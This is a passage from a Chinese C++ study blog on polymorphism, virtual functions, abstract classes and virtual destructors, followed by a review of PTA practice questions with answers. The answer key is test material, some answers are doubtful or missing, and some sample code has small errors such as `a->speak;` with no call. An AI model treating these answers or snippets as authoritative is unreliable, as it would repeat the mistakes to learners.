class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">animal</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;animal说话&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cat</span>:<span class="hljs-keyword">public</span> animal<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;cat说话&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dospeak</span><span class="hljs-params">(animal&amp; ani)</span></span><br><span class="hljs-function"></span>&#123;<br>ani.<span class="hljs-built_in">speak</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cat c;<br><span class="hljs-built_in">dospeak</span>(c);<span class="hljs-comment">//父子之间不用强制类型转换，父类能直接用子类的引用或者指针</span><br>&#125;<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1745213483114.png"></p><p>地址早绑定，编译阶段就确定了函数的地址，无论穿什么参数，都会执行<code>ani.speak()</code>，</p><p>如果要执行cat说话，地址就<strong>不能早绑定</strong>，需要在<strong>运行阶段绑定</strong>，也就是<strong>晚绑定</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">animal</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br>     <span class="hljs-comment">//虚函数，实现地址晚绑定</span><br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;animal说话&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cat</span>:<span class="hljs-keyword">public</span> animal<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;cat说话&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">dospeak</span><span class="hljs-params">(animal&amp; ani)</span></span><br><span class="hljs-function"></span>&#123;<br>ani.<span class="hljs-built_in">speak</span>();<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cat c;<br><span class="hljs-built_in">dospeak</span>(c);<span class="hljs-comment">//父子之间不用强制类型转换，父类能直接用子类的引用或者指针</span><br>&#125;<br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1745298210863.png"></p><p>动态多态的条件：</p><ul><li>有继承关系</li><li>子类重写父类的虚函数<ul><li>重写：函数返回值类型 函数名 参数列表完全相同</li></ul></li></ul><p>动态多态的使用：</p><ul><li>父类的指针或者引用指向子类的对象</li></ul><h2 id="多态的本质"><a href="#多态的本质" class="headerlink" title="多态的本质"></a>多态的本质</h2><ul><li>当父类使用virtual关键字创建虚函数的时候，其内部会有一个vfptr(virtual function prt)指针父类的虚函数表，这个时候父类的虚函数表中会有一个地址：&amp;animal::speak</li></ul><p><img src="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1745412561491.png"></p><ul><li>当子类继承父类的时候会继承父类的vfptr指针，指向子类的虚函数表，但是当子类重写父类的虚函数的时候，会将自身的虚函数表中的地址给替换掉，替换成：&amp;cat::speak，这样就可以调用指向cat::speak的指针</li></ul><p><img src="/2025/03/19/c++%E8%AF%AD%E6%B3%95%E5%AD%A6%E4%B9%A0/1745412627477.png"></p><h2 id="案例1：计算器类"><a href="#案例1：计算器类" class="headerlink" title="案例1：计算器类"></a>案例1：计算器类</h2><p>案例描述：分别利用普通写法和多态技术，实现两个操作数进行运算的计算机类</p><p>多态优点：</p><ul><li>代码组织结构清晰</li><li>可读性强</li><li>利于前期和后期的扩展和维护</li></ul><p>普通：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">cac</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-type">int</span> n1;<br><span class="hljs-type">int</span> n2;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getresult</span><span class="hljs-params">(string oper)</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-keyword">if</span> (oper == <span class="hljs-string">&quot;+&quot;</span>)<br><span class="hljs-keyword">return</span> n1 + n2;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (oper == <span class="hljs-string">&quot;-&quot;</span>)<br><span class="hljs-keyword">return</span> n1 - n2;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (oper == <span class="hljs-string">&quot;*&quot;</span>)<br><span class="hljs-keyword">return</span> n1 * n2;<br><span class="hljs-comment">//如果要扩展新功能，需要修改源码</span><br><span class="hljs-comment">//在真实开发中，提倡开闭原则：对扩展进行开放，对修改进行关闭</span><br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cac c;<br>c.n1 = <span class="hljs-number">10</span>;<br>c.n2 = <span class="hljs-number">10</span>;<br>cout &lt;&lt; c.<span class="hljs-built_in">getresult</span>(<span class="hljs-string">&quot;+&quot;</span>) &lt;&lt; endl;<br>cout &lt;&lt; c.<span class="hljs-built_in">getresult</span>(<span class="hljs-string">&quot;-&quot;</span>) &lt;&lt; endl;<br>cout &lt;&lt; c.<span class="hljs-built_in">getresult</span>(<span class="hljs-string">&quot;*&quot;</span>) &lt;&lt; endl;<br>&#125;;<br></code></pre></td></tr></table></figure><p>多态：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">basecac</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">int</span> <span class="hljs-title">getresult</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-type">int</span> n1;<br><span class="hljs-type">int</span> n2;<br>&#125;;<br><span class="hljs-comment">//加法类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">addcac</span>:<span class="hljs-keyword">public</span> basecac<br>&#123;<br><span class="hljs-keyword">public</span>:<br>     <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getresult</span><span class="hljs-params">()</span></span><br><span class="hljs-function">     </span>&#123;<br>          <span class="hljs-keyword">return</span> n1+n2;<br>     &#125;<br>&#125;;<br><span class="hljs-comment">//减法类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">jfcac</span>:<span class="hljs-keyword">public</span> basecac<br>&#123;<br><span class="hljs-keyword">public</span>:<br>     <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">getresult</span><span class="hljs-params">()</span></span><br><span class="hljs-function">     </span>&#123;<br>          <span class="hljs-keyword">return</span> n1-n2;<br>     &#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>     basecac *a=<span class="hljs-keyword">new</span> addcac;<span class="hljs-comment">//用父类指针指向子类对象，发生多态</span><br>     basecac *b=<span class="hljs-keyword">new</span> jfcac;<br>     a-&gt;n1=<span class="hljs-number">10</span>;<br>     a-&gt;n2=<span class="hljs-number">10</span>;<br>     b-&gt;n1=<span class="hljs-number">20</span>;<br>     b-&gt;n2=<span class="hljs-number">10</span>;<br>     cout&lt;&lt;a-&gt;<span class="hljs-built_in">getresult</span>()&lt;&lt;endl;<br>     cout&lt;&lt;b-&gt;<span class="hljs-built_in">getresult</span>()&lt;&lt;endl;<br>     <span class="hljs-comment">//用完后堆区记得销毁</span><br>     <span class="hljs-keyword">delete</span> a;<br>     <span class="hljs-keyword">delete</span> b;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见优点：</p><ul><li>组织结构清晰</li><li>可读性强</li><li>便于前期和后期的扩展的修改</li></ul><blockquote><p>总结：C++开发中提倡利用多态设计程序架构，其优点很多</p></blockquote><h2 id="纯虚函数和抽象类"><a href="#纯虚函数和抽象类" class="headerlink" title="纯虚函数和抽象类"></a>纯虚函数和抽象类</h2><p>在多态中，通常父类中的虚函数的实现是毫无意义的，主要都是在调用子类重写的内容</p><p>因此可以将虚函数改成纯虚函数</p><p>语法：<code>virtual 返回值类型 函数名 (参数列表)=0</code></p><p>当类中有一个纯虚函数，这个类也就称为<strong>抽象类</strong></p><p>抽象类特点：</p><ul><li><strong>无法实例化对象</strong></li><li><strong>子类必须要重写抽象类的纯虚函数，否则这个子类也属于抽象类</strong></li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">base</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>=<span class="hljs-number">0</span>;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">son</span>:<span class="hljs-keyword">public</span> base<br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>&#123;&#125;<span class="hljs-comment">//子类必须要重写父类中的纯虚函数</span><br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="虚析构和纯虚析构"><a href="#虚析构和纯虚析构" class="headerlink" title="虚析构和纯虚析构"></a>虚析构和纯虚析构</h2><p>多态使用时，如果子类中有属性开辟到堆区，那么父类指针在释放时无法调用到子类的析构代码</p><p>解决：将父类中析构函数改为<strong>虚析构或纯虚析构</strong></p><p>虚析构和纯虚析构共性</p><ul><li>可以解决父类指针释放子类对象</li><li>都需要有具体的函数实现</li></ul><p>区别：</p><ul><li>如果是纯虚析构函数，该类属于抽象类，无法实例化对象</li></ul><p>虚析构：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">animal</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">animal</span>()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;动物活了&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>&#125;<br><span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">animal</span>()<span class="hljs-comment">//改成虚析构后在销毁父类指针后才会执行子类析构</span><br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;动物死了&quot;</span>&lt;&lt;endl;<br>&#125;<br>&#125;;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cat</span>:<span class="hljs-keyword">public</span> animal<br>&#123;<br><span class="hljs-keyword">public</span>:<br>string *name=<span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">cat</span>(string n)<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;猫活了&quot;</span>&lt;&lt;endl;<br>name=<span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(n);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;1&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">cat</span>()<br>&#123;<br><span class="hljs-keyword">if</span> (name!=<span class="hljs-literal">NULL</span>)<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;猫死了&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">delete</span> name;<br>name=<span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>animal* a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">cat</span>(<span class="hljs-string">&quot;aa&quot;</span>);<br>a-&gt;speak;<br><span class="hljs-comment">//父类指针在析构的时候不会调用子类的析构函数</span><br><span class="hljs-keyword">delete</span> a;<br>&#125;<br></code></pre></td></tr></table></figure><p>纯虚析构：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">animal</span><br>&#123;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">animal</span>()<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;动物活了&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>&#125;<br><span class="hljs-comment">//virtual ~animal()//改成虚析构后在销毁父类指针后才会执行子类析构</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//cout&lt;&lt;&quot;动物死了&quot;&lt;&lt;endl;</span><br><span class="hljs-comment">//&#125;</span><br>     <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">animal</span>()=<span class="hljs-number">0</span>;<span class="hljs-comment">//注意纯虚析构必须要有函数实现</span><br>&#125;;<br>animal::~<span class="hljs-built_in">animal</span>()<span class="hljs-comment">//这个是必须的</span><br>&#123;<br>     cout&lt;&lt;<span class="hljs-string">&quot;纯虚析构&quot;</span>&lt;&lt;endl;<br>&#125;<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">cat</span>:<span class="hljs-keyword">public</span> animal<br>&#123;<br><span class="hljs-keyword">public</span>:<br>string *name=<span class="hljs-literal">NULL</span>;<br><span class="hljs-built_in">cat</span>(string n)<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;猫活了&quot;</span>&lt;&lt;endl;<br>name=<span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>(n);<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">speak</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;1&quot;</span>&lt;&lt;endl;<br>&#125;<br>~<span class="hljs-built_in">cat</span>()<br>&#123;<br><span class="hljs-keyword">if</span> (name!=<span class="hljs-literal">NULL</span>)<br>&#123;<br>cout&lt;&lt;<span class="hljs-string">&quot;猫死了&quot;</span>&lt;&lt;endl;<br><span class="hljs-keyword">delete</span> name;<br>name=<span class="hljs-literal">NULL</span>;<br>&#125;<br>&#125;<br>&#125;;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">test01</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>animal* a=<span class="hljs-keyword">new</span> <span class="hljs-built_in">cat</span>(<span class="hljs-string">&quot;aa&quot;</span>);<br>a-&gt;speak;<br><span class="hljs-comment">//父类指针在析构的时候不会调用子类的析构函数</span><br><span class="hljs-keyword">delete</span> a;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="PTA错题回顾"><a href="#PTA错题回顾" class="headerlink" title="PTA错题回顾"></a>PTA错题回顾</h1><h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><h3 id="0x001"><a href="#0x001" class="headerlink" title="0x001"></a>0x001</h3><p>对于已正确定义的二维数组a,  *(a[i]+j)与a[i][j]的含义相同。  </p><p>T    F</p><ul><li>答案为T</li></ul><h3 id="0x002"><a href="#0x002" class="headerlink" title="0x002"></a>0x002</h3><p>不允许把一个数值或字符赋予指针变量。  </p><p>T     F</p><ul><li>答案为T</li></ul><h3 id="0x003"><a href="#0x003" class="headerlink" title="0x003"></a>0x003</h3><p>若重载为友元函数，函数定义格式如下：</p><p>&lt;类型&gt;operator&lt;运算符&gt;（&lt;参数列表&gt;）</p><p>{</p><p>&lt;函数体&gt;</p><p>}  </p><p>T    F</p><ul><li>答案为F</li></ul><h3 id="0x004"><a href="#0x004" class="headerlink" title="0x004"></a>0x004</h3><p>对每个可重载的运算符来讲，它既可以重载为友元函数，又可以重载为成员函数，还可以重载为非成员函数。  </p><p>T     F</p><ul><li>答案为F，有些运算符必须要用全局函数来重载，比如说左移（&lt;&lt;）</li></ul><h3 id="0x005"><a href="#0x005" class="headerlink" title="0x005"></a>0x005</h3><p>重定义虚函数的派生类必须是公有继承的。  </p><p>T     F</p><ul><li>T</li></ul><h3 id="0x006"><a href="#0x006" class="headerlink" title="0x006"></a>0x006</h3><p>如果一个类的函数全部都是纯虚函数，则这个类不能有自己类的实现（包括引用和指针），只能通过派生类继承实现。</p><p>T     F</p><ul><li>F</li></ul><h3 id="0x007"><a href="#0x007" class="headerlink" title="0x007"></a>0x007</h3><p>虚函数既可以在函数说明时定义，也可以在函数实现时定义。</p><p>T    F</p><ul><li>F</li></ul><h3 id="0x008"><a href="#0x008" class="headerlink" title="0x008"></a>0x008</h3><p>含有纯虚函数的类是不可以用来创建对象的，因为它是虚基类。 </p><p>T    F</p><ul><li>F，是抽象类</li></ul><h2 id="选择"><a href="#选择" class="headerlink" title="选择"></a>选择</h2><h3 id="0x001-1"><a href="#0x001-1" class="headerlink" title="0x001"></a>0x001</h3><p>执行以下的程序片段，将输出几个数字？</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++);<br><br>       <span class="hljs-built_in">cout</span>&lt;&lt;i;<br></code></pre></td></tr></table></figure><p>A.0B.3C.2D.1</p><ul><li>答案为D<ul><li>for循环后有分号，cout不在循环体内</li></ul></li></ul><h3 id="0x002-1"><a href="#0x002-1" class="headerlink" title="0x002"></a>0x002</h3><p>以下数组定义中错误的是（ ）。</p><p>A.<br><code>int x[2][3]=&#123;&#123;1,2&#125;,&#123;3,4&#125;,&#123;5,6)&#125;;</code></p><p>B.<br><code>int x[][3]=&#123;&#123;1,2,3&#125;,(4,5,6)&#125;;</code></p><p>C.<br><code>int x[][3]=&#123;0&#125;;</code></p><p>D.<br><code>int x[2][3]=&#123;1,2,3,4,5,6&#125;;</code></p><ul><li>答案为A，定义的数组是两行三列的，而给出的数据是三行两列的</li></ul><h3 id="0x003-1"><a href="#0x003-1" class="headerlink" title="0x003"></a>0x003</h3><p>设变量定义为 <code>int a[2]=&#123;1,3&#125;, *p=&amp;a[0]+1;</code>，则<code>*p</code>的值是(       )。</p><p>A.&amp;a[0]+1B.2C.4D.3</p><ul><li>答案为D，*p代表地址上的值</li></ul><h3 id="0x004-1"><a href="#0x004-1" class="headerlink" title="0x004"></a>0x004</h3><p>对类的构造函数和析构函数描述正确的是( )。</p><p>A.构造函数不能重载，析构函数也不能重裁</p><p>B.构造函数不能重载，析构函数可以重载</p><p>C.构造函数可以重载，析构函数不能重载</p><p>D.构造函数可以重载，析构函数也可以重载</p><ul><li>答案为C</li></ul><h3 id="0x005-1"><a href="#0x005-1" class="headerlink" title="0x005"></a>0x005</h3><p>下列程序的运行结果是（）。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs elixir">int i;<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">3</span>;i++)<br>   switch(i)<br>   &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span><span class="hljs-symbol">:cout&lt;&lt;i</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span><span class="hljs-symbol">:cout&lt;&lt;i</span>;<br>        <span class="hljs-symbol">default:</span>cout&lt;&lt;i;<br>   &#125;<br></code></pre></td></tr></table></figure><p>A.012</p><p>B.011122</p><p>C.012020</p><p>D.120</p><ul><li>答案为B，因为case里面没有break</li></ul><h3 id="0x006-1"><a href="#0x006-1" class="headerlink" title="0x006"></a>0x006</h3><p>一个函数为<code>void f(int x, char y = &#39;a&#39;)</code>，另一个函数为<code>void f(int)</code>，则它们_</p><p>A.不能在同一程序块中定义</p><p>B.可以在同一个程序块中定义，但不可以重载</p><p>C.以上说法均不正确</p><p>D.可以在同一个程序块中定义并可重载</p><ul><li>答案为D</li></ul><h3 id="0x007-1"><a href="#0x007-1" class="headerlink" title="0x007"></a>0x007</h3><p>关于类模板，描述错误的是。</p><p>A.一个普通基类不能派生类模板</p><p>B.类模板可以从普通类派生，也可以从类模板派生</p><p>C.根据建立对象时的实际数据类型，编译器把类模板实例化为模板类</p><p>D.函数的类模板参数需生成模板类并通过构造函数实例化</p><ul><li>答案A</li></ul><h3 id="0x008-1"><a href="#0x008-1" class="headerlink" title="0x008"></a>0x008</h3><p>类模板的参数错误的说法是：</p><p>A.可以有多个</p><p>B.可以有0个</p><p>C.参数不能给初值</p><p>D.不能有基本数据类型</p><ul><li>答案</li></ul><h3 id="0x009"><a href="#0x009" class="headerlink" title="0x009"></a>0x009</h3><p>若需要为xv类重载乘法运算符,运算结果为xv类型,在将其声明为类的成员函数时,下列原型声明正确的是_________。</p><p>A.<code>xv operator*(xv);</code></p><p>B.<code>operator*(xv);</code></p><p>C.<code>xv*(xv);*</code></p><p>D.<code>xv operator*(xv,xv);</code></p><ul><li>答案为A</li></ul><h3 id="0x00A"><a href="#0x00A" class="headerlink" title="0x00A"></a>0x00A</h3><p>继承机制的作用是</p><p>A.数据封装B.数据抽象C.信息隐藏D.定义新类</p><ul><li>答案为D</li></ul><h3 id="0x00B"><a href="#0x00B" class="headerlink" title="0x00B"></a>0x00B</h3><p>一个类的私有成员</p><p>A.只能被该类的成员函数和友元函数访问</p><p>B.以上答案都不对</p><p>C.只能被该类的成员函数访问</p><p>D.只能被该类的成员函数、友元函数和派生类访问</p><ul><li>答案为A</li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><h3 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h3><p><strong>R7-1 定义类模板实现2个数的算术运算</strong></p><p>分数 20</p><p>全屏浏览切换布局</p><p>作者 孙杰</p><p>单位 青岛大学</p><p>本题目要求定义类模板实现2个数的最大值、最小值、加、减、乘、除等算术运算，在main（）函数中使用该类模板分别实例化为int型和double型的类，定义相关的对象，读入2个整数和2个浮点数，然后分别输出它们的最大值、最小值、加、减、乘、除的结果。</p><p><strong>输入格式:</strong></p><p>分别输入2组数字，第一行为2个整数，以空格分隔；第二行为2个浮点数，以空格分隔。</p><p><strong>输出格式:</strong></p><p>分2行分别输出整数和浮点数的运算结果，每行依次输出2个数的最大值、最小值、加、减、乘、除等算术运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 